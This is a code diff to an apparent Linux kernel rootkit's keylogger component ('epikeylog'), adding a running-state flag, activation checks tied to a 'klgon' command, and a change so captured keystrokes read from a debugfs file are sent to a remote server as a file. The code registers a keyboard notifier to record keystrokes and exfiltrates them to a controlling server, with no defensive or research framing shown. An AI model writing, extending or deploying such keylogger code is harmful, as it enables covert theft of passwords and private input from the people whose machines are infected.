@@ -21,6 +21,8 @@ static int codes;
 static struct dentry *file;
 static struct dentry *subdir;
 
+static bool is_running = false;
+
 static ssize_t keys_read(struct file *filp,
 		char *buffer,
 		size_t len,
@@ -163,16 +165,16 @@ int epikeylog_cb(struct notifier_block *nblock, unsigned long code, void *_param
 }
 
 int epikeylog_send_to_server(void){
+	if (!is_running) {
+		DBG_MSG("epikeylog_send_to_server: not running\n");
+
+		send_to_server("epikeylog_send_to_server: not running. Activate it with `klgon`.\n");
+
+		return -EBUSY;
+	}
 	exec_str_as_command("cat /sys/kernel/debug/kisni/keys", true);
 	// Send the result back to the server
-	char result_msg[STD_BUFFER_SIZE];
-	snprintf(result_msg, STD_BUFFER_SIZE, 
-				"keylogger content: %s\n", 
-				exec_result.std_out);
-	int ret_code = send_to_server(result_msg);
-	if (ret_code != SUCCESS) {
-		ERR_MSG("epikeylog_send_to_server: failed to send kelogger content\n");
-	}
+	int ret_code = send_file_to_server(STDOUT_FILE);
 	DBG_MSG("epikeylog_send_to_server: kelogger content sent\n");
 	return ret_code;
 }
@@ -187,6 +189,11 @@ int epikeylog_send_to_server(void){
  * the appropriate error code in case of any error
  */
 int epikeylog_init(int keylog_mode){
+	if (is_running) {
+		DBG_MSG("epikeylog_init: already running\n");
+		return -EBUSY;
+	}
+
 	codes = keylog_mode;
 
 	if (codes < 0 || codes > 2)
@@ -210,7 +217,10 @@ int epikeylog_init(int keylog_mode){
 	* when an event occurs.
 	*/
 	register_keyboard_notifier(&epikeylog_blk);
-	return 0;
+
+	is_running = true;
+
+	return SUCCESS;
 }
 
 /**
@@ -220,7 +230,16 @@ int epikeylog_init(int keylog_mode){
  * Cleans up the debugfs directory to log keys
  */
 int epikeylog_exit(void){
+	if (!is_running) {
+		DBG_MSG("epikeylog_exit: already stopped\n");
+		return -EBUSY;
+	}
+
 	unregister_keyboard_notifier(&epikeylog_blk);
 	debugfs_remove_recursive(subdir);
-	return 0;
+	is_running = false;
+
+	DBG_MSG("epikeylog_exit: epikeylog desactivated\n");
+
+	return SUCCESS;
 }
